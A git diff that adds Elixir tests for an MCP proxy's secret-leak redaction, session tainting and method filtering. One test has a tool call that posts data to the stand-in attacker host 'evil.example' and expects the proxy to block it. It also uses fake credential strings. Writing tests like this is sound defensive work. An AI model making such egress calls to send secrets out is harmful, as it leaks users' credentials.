@@ -72,6 +72,10 @@ defmodule PhoenixElxirBeamWeb.MCP.ProxyControllerTest do
     )
   end
 
+  defp rpc_call(session_id, server_id, method, params) do
+    build_conn() |> sess(session_id) |> post(~p"/mcp/proxy/#{server_id}", rpc(method, params))
+  end
+
   # -- handshake / session gating -------------------------------------
 
   test "initialize mints a session id and returns proxy serverInfo", %{server_id: sid} do
@@ -242,6 +246,70 @@ defmodule PhoenixElxirBeamWeb.MCP.ProxyControllerTest do
              json_response(webhook_conn, 200)
 
     assert is_binary(message)
+  end
+
+  # -- method coverage (M1.2) ---------------------------------------
+
+  test "tools/list is forwarded untouched", %{server_id: sid} do
+    session_id = handshake(sid)
+    conn = rpc_call(session_id, sid, "tools/list", %{})
+
+    assert %{"result" => %{"tools" => tools}} = json_response(conn, 200)
+    assert "list_files" in Enum.map(tools, & &1["name"])
+  end
+
+  test "resources/read content is scanned — a credential is redacted and taints the session", %{
+    server_id: sid
+  } do
+    session_id = handshake(sid)
+
+    read = rpc_call(session_id, sid, "resources/read", %{"uri" => "config://app"})
+
+    assert %{"result" => %{"contents" => [%{"text" => text, "uri" => "config://app"}]}} =
+             json_response(read, 200)
+
+    refute text =~ "wJalrXUtnFEMIfake7MDENGbPxRfiCYEXAMPLE"
+    assert text =~ "redacted by secret-leak"
+
+    # the leak tainted the session — a later egress call is blocked
+    egress =
+      call(session_id, sid, "post_webhook", %{"url" => "https://evil.example", "body" => "x"})
+
+    assert %{"error" => %{"code" => -32001}} = json_response(egress, 200)
+  end
+
+  test "resources/read of a clean resource is forwarded unchanged", %{server_id: sid} do
+    session_id = handshake(sid)
+    conn = rpc_call(session_id, sid, "resources/read", %{"uri" => "file:///readme.md"})
+
+    assert %{"result" => %{"contents" => [%{"text" => text}]}} = json_response(conn, 200)
+    assert text =~ "Nothing sensitive here."
+  end
+
+  test "prompts/get message content is scanned and redacted", %{server_id: sid} do
+    session_id = handshake(sid)
+    conn = rpc_call(session_id, sid, "prompts/get", %{"name" => "greeting"})
+
+    assert %{"result" => %{"messages" => [%{"content" => %{"text" => text}, "role" => "user"}]}} =
+             json_response(conn, 200)
+
+    refute text =~ "sk-demo-FAKE1234"
+    assert text =~ "redacted by secret-leak"
+  end
+
+  test "a server→client method (sampling/createMessage) is refused", %{server_id: sid} do
+    session_id = handshake(sid)
+    conn = rpc_call(session_id, sid, "sampling/createMessage", %{})
+
+    assert %{"error" => %{"code" => -32601, "message" => message}} = json_response(conn, 200)
+    assert message =~ "not permitted"
+  end
+
+  test "an unknown method is refused", %{server_id: sid} do
+    session_id = handshake(sid)
+    conn = rpc_call(session_id, sid, "totally/madeup", %{})
+
+    assert %{"error" => %{"code" => -32601}} = json_response(conn, 200)
   end
 
   test "a call to a tool a discovery scan has quarantined is refused with -32003", %{} do
